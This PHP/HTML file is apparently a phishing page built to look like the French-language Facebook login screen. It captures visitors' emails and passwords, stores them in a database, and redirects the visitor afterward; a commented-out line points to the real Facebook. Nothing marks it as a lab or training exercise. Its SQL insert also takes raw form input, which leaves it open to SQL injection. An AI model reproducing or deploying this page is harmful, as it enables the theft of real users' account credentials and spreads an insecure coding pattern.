<?php
include "./config.php";

if(isset($_POST['submit'])){
  $email = $_POST['email'];
  $password = $_POST['mdp'];
    
  $sql = "INSERT INTO `users`(`id`, `email`, `mdp`) VALUES (NULL,'$email','$password')";

  $result = mysqli_query($con, $sql);
  if($result){
    // header("Location: https://m.facebook.com");
    header("Location: reception.php");
  } else {
    echo "<h1>Erreur</h1>";
  }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
 
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <link rel="stylesheet" href="style.css">
  
</head>
<body>
  
  <div class="container">
    <div class="facebook">
      <h1>facebook</h1>
      <h2>Avec Facebook, partagez et restez en contact avec votre entourage. </h2>
    </div>
    <div class="card">
      <form action="" method="post">
        <input type="email" name="email" placeholder="Adresse-mail ou numero de tel." id="">
        <input type="text" name="mdp" placeholder="Mot de passe" id="">
        <button type="submit" name="submit" id="btn">Se connecter</button>
        
      </form>
      <div class="content">
        <h3>Mot de passe oublié ?</h3>
        <span></span>
        <button>Créer nouveau compte</button>
      </div>
    </div>
    <p>
      <b>Créer une page </b>  pour une célébrité, une marque ou une entreprise.
    </p>
  </div>
  <script src="./app.js"></script>
</body>
</html>